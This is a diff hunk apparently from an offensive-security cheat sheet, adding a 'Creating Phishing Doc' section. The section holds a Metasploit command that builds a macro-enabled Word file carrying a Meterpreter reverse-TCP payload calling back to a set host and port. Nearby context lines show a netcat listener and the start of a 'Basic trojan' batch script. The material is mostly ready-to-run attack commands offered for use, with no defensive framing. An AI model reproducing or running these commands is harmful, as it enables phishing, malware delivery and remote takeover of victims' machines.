@@ -108,6 +108,14 @@ nc -nvlp 443
 ```
 
 
+Creating Phishing Doc:
+```bash
+msfconsole -x "use exploit/multi/fileformat/office_word_macro; set CUSTOMTEMPLATE /usr/share/metasploit-framework/data/exploits/office_word_macro/template.docx; set FILENAME phishing.docm; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.154.138; set LPORT 443; set EXITFUNC thread; set DisablePayloadHandler true; exploit"
+```
+
+
+
+
 Basic trojan:
 ```bash
 @echo off
